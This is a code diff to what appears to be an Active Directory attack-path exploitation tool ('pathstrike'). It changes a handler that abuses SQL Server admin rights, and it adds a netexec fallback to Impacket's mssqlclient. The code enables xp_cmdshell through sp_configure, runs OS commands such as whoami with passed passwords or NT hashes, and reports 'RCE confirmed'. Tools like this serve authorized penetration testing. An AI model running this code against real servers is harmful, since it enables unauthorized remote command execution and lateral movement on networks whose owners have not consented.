@@ -57,11 +57,11 @@ class SQLAdminHandler(BaseEdgeHandler):
         Returns:
             ``(ok, message)`` tuple.
         """
-        if not shutil.which("mssqlclient.py"):
+        if not shutil.which("mssqlclient.py") and not shutil.which("netexec"):
             return (
                 False,
-                "mssqlclient.py not found on PATH. "
-                "Install via: pip install impacket",
+                "Neither mssqlclient.py (Impacket) nor netexec found on PATH. "
+                "Install via: pip install impacket netexec",
             )
 
         source_user = self._resolve_principal(edge)
@@ -137,6 +137,21 @@ class SQLAdminHandler(BaseEdgeHandler):
             password = self.config.credentials.password
             nt_hash = self.config.credentials.nt_hash
 
+        async def _impacket_mssql(**kwargs):
+            """Call Impacket's mssqlclient defensively.
+
+            The wrapper may not expose an mssql helper in every build; treat a
+            missing function or any runtime error as a failed result so the
+            netexec fallback below engages instead of raising.
+            """
+            fn = getattr(impacket, "mssqlclient", None)
+            if fn is None:
+                return {"success": False, "error": "impacket mssql helper unavailable"}
+            try:
+                return await fn(**kwargs)
+            except Exception as exc:  # pragma: no cover - defensive
+                return {"success": False, "error": str(exc)}
+
         # Step 1: Enable xp_cmdshell
         self.logger.info(
             "SQLAdmin Step 1: Enabling xp_cmdshell on %s", self._sql_target,
@@ -145,7 +160,7 @@ class SQLAdminHandler(BaseEdgeHandler):
             "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; "
             "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
         )
-        enable_result = await impacket.mssqlclient(
+        enable_result = await _impacket_mssql(
             target=sql_host,
             command=enable_cmd,
             auth_args=auth_flags,
@@ -172,7 +187,7 @@ class SQLAdminHandler(BaseEdgeHandler):
             self._sql_target,
         )
         whoami_cmd = "EXEC xp_cmdshell 'whoami';"
-        whoami_result = await impacket.mssqlclient(
+        whoami_result = await _impacket_mssql(
             target=sql_host,
             command=whoami_cmd,
             auth_args=auth_flags,
@@ -184,10 +199,38 @@ class SQLAdminHandler(BaseEdgeHandler):
         )
 
         if not whoami_result["success"]:
+            # Fallback: netexec's mssql protocol enables + invokes xp_cmdshell
+            # in one shot (handles its own xp_cmdshell toggling).
+            self.logger.info(
+                "mssqlclient xp_cmdshell failed on %s; falling back to netexec mssql",
+                self._sql_target,
+            )
+            from pathstrike.tools.netexec_wrapper import mssql_exec
+
+            nxc_result = await mssql_exec(
+                sql_host, self._get_nxc_auth_args(source_user), "whoami"
+            )
+            if nxc_result.get("success"):
+                rce_user = (
+                    (nxc_result.get("parsed") or {}).get("command_output")
+                    or nxc_result.get("output", "")
+                ).strip()
+                # netexec manages xp_cmdshell itself; nothing for us to roll back.
+                self.logger.info(
+                    "RCE confirmed on %s as '%s' (netexec fallback)",
+                    self._sql_target, rce_user,
+                )
+                return (
+                    True,
+                    f"SQLAdmin exploitation on {self._sql_target}: RCE confirmed "
+                    f"as '{rce_user}' (netexec mssql fallback).",
+                    [],
+                )
             return (
                 False,
                 f"xp_cmdshell execution failed on {self._sql_target}: "
-                f"{whoami_result.get('error', 'unknown')}",
+                f"{whoami_result.get('error', 'unknown')} "
+                f"(netexec mssql fallback: {nxc_result.get('error', 'unknown')})",
                 [],
             )
 
